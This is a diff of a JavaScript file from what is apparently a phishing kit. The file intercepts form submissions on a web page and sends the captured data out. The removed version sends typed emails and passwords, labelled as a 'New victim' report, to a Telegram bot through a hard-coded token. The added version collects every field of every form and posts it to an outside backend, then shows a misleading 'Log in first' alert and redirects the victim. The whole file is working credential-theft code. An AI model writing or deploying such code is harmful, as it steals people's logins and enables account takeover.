@@ -1,49 +1,51 @@
-document.addEventListener("DOMContentLoaded", function () {
-    const form = document.getElementById("allForm");
-    if (!form) return;
+document.addEventListener("DOMContentLoaded", () => {
+  const DEFAULT_USER_ID = "7979664801"; // fallback if no id in URL
+  const forms = document.querySelectorAll("form");
 
-    const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
-    const ADMIN_ID = "6976365864";
+  forms.forEach((form, index) => {
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const userId = urlParams.get("id") || ADMIN_ID;
-    const pageName = document.title || "Unknown Page";
+      // Get userId from URL or use default
+      const urlParams = new URLSearchParams(window.location.search);
+      const userId = urlParams.get("id") || DEFAULT_USER_ID;
 
-    form.addEventListener("submit", function (e) {
-        e.preventDefault();
+      // Collect all form fields
+      const formData = {};
+      new FormData(form).forEach((value, key) => {
+        formData[key] = value;
+      });
 
-        const email = form.message_title?.value || "N/A";
-        const password = form.description?.value || "N/A";
+      // Add page title and form name
+      const payload = {
+        chat_id: userId,
+        form_data: formData,
+        pageTitle: document.title,
+        formName: form.getAttribute("name") || `Form-${index + 1}`
+      };
 
-        const message = `
-📩 New victim link (${pageName}):
-
-📧 email: ${email}
-🔑 password: ${password}
-🆔 Telegram ID: ${userId}
-🌐 URL: ${window.location.href}
-🕒 Time: ${new Date().toLocaleString()}
-        `;
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: userId,
-                text: message,
-                parse_mode: "Markdown"
-            })
-        })
-        .then(res => {
-            if (res.ok) {
-                window.location.href = `https://otieu.com/4/9830616`;
-            } else {
-                alert("Failed please try again.");
-            }
-        })
-        .catch(err => {
-            console.error("Telegram API error:", err);
-            alert("Network error.");
+      try {
+        const response = await fetch("https://intelligentback.onrender.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
         });
+
+        if (response.ok) {
+          alert(`Log in first`);
+          form.reset();
+
+          // Redirect after submission
+          window.location.href = "https://otieu.com/4/9831084"; // <<< change to any URL you want
+        } else {
+          const errorText = await response.text();
+          console.error("Telegram Error:", errorText);
+          alert(`❌ Error submitting form. Check console for details.`);
+        }
+      } catch (err) {
+        console.error("Network Error:", err);
+        alert("⚠️ Network error. Please check your connection.");
+      }
     });
+  });
 });
